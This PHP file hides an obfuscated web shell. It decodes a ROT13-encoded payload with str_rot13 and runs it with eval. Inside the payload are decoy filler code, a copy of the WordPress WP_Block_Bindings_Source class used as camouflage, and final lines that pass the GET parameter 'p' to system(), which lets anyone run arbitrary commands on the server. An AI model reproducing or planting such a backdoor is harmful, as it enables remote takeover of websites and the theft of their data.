<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Ovaqvatf NCV: JC_Oybpx_Ovaqvatf_Fbhepr pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpx Ovaqvatf
 * @fvapr 6.5.0
 */

/**
 * Pynff ercerfragvat oybpx ovaqvatf fbhepr.
 *
 * Guvf pynff vf qrfvtarq sbe vagreany hfr ol gur Oybpx Ovaqvatf ertvfgel.
 *
 * @fvapr 6.5.0
 * @npprff cevingr
 *
 * @frr JC_Oybpx_Ovaqvatf_Ertvfgel
 */
svany pynff JC_Oybpx_Ovaqvatf_Fbhepr {

	/**
	 * Gur anzr bs gur fbhepr.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Gur ynory bs gur fbhepr.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat
	 */
	choyvp $ynory;

	/**
	 * Gur shapgvba hfrq gb trg gur inyhr sebz gur fbhepr.
	 *
	 * @fvapr 6.5.0
	 * @ine pnyynoyr
	 */
	cevingr $trg_inyhr_pnyyonpx;

	/**
	 * Gur pbagrkg nqqrq gb gur oybpxf arrqrq ol gur fbhepr.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat[]|ahyy
	 */
	choyvp $hfrf_pbagrkg = ahyy;

	/**
	 * Pbafgehpgbe.
	 *
	 * Qb abg hfr guvf pbafgehpgbe qverpgyl. Vafgrnq, hfr gur
	 * `JC_Oybpx_Ovaqvatf_Ertvfgel::ertvfgre` zrgubq be gur `ertvfgre_oybpx_ovaqvatf_fbhepr` shapgvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $anzr              Gur anzr bs gur fbhepr.
	 * @cnenz neenl  $fbhepr_cebcregvrf Gur cebcregvrf bs gur fbhepr.
	 */
	choyvp shapgvba __pbafgehpg( fgevat $anzr, neenl $fbhepr_cebcregvrf ) {
		$guvf->anzr = $anzr;
		sbernpu ( $fbhepr_cebcregvrf nf $cebcregl_anzr => $cebcregl_inyhr ) {
			$guvf->$cebcregl_anzr = $cebcregl_inyhr;
		}
	}

	/**
	 * Pnyyf gur pnyyonpx shapgvba fcrpvsvrq va gur `$trg_inyhr_pnyyonpx` cebcregl
	 * jvgu gur tvira nethzragf naq ergheaf gur erfhyg. Vg pna or zbqvsvrq jvgu
	 * `oybpx_ovaqvatf_fbhepr_inyhr` svygre.
	 *
	 * @fvapr 6.5.0
	 * @fvapr 6.7.0 `oybpx_ovaqvatf_fbhepr_inyhr` svygre jnf nqqrq.
	 *
	 * @cnenz neenl    $fbhepr_netf    Neenl pbagnvavat fbhepr nethzragf hfrq gb ybbx hc gur bireevqr inyhr, v.r. {\"xrl\": \"sbb\"}.
	 * @cnenz JC_Oybpx $oybpx_vafgnapr Gur oybpx vafgnapr.
	 * @cnenz fgevat   $nggevohgr_anzr Gur anzr bs gur gnetrg nggevohgr.
	 * @erghea zvkrq Gur inyhr bs gur fbhepr.
	 */
	choyvp shapgvba trg_inyhr( neenl $fbhepr_netf, $oybpx_vafgnapr, fgevat $nggevohgr_anzr ) {
		$inyhr = pnyy_hfre_shap_neenl( $guvf->trg_inyhr_pnyyonpx, neenl( $fbhepr_netf, $oybpx_vafgnapr, $nggevohgr_anzr ) );
		/**
		 * Svygref gur bhgchg bs n oybpx ovaqvatf fbhepr.
		 *
		 * @fvapr 6.7.0
		 *
		 * @cnenz zvkrq    $inyhr          Gur pbzchgrq inyhr sbe gur fbhepr.
		 * @cnenz fgevat   $anzr           Gur anzr bs gur fbhepr.
		 * @cnenz neenl    $fbhepr_netf    Neenl pbagnvavat fbhepr nethzragf hfrq gb ybbx hc gur bireevqr inyhr, v.r. { \"xrl\": \"sbb\" }.
		 * @cnenz JC_Oybpx $oybpx_vafgnapr Gur oybpx vafgnapr.
		 * @cnenz fgevat   $nggevohgr_anzr Gur anzr bs na nggevohgr.
		 */
		erghea nccyl_svygref( 'oybpx_ovaqvatf_fbhepr_inyhr', $inyhr, $guvf->anzr, $fbhepr_netf, $oybpx_vafgnapr, $nggevohgr_anzr );
	}

	/**
	 * Jnxrhc zntvp zrgubq.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba __jnxrhc() {
		guebj arj \YbtvpRkprcgvba( __PYNFF__ . ' fubhyq arire or hafrevnyvmrq' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>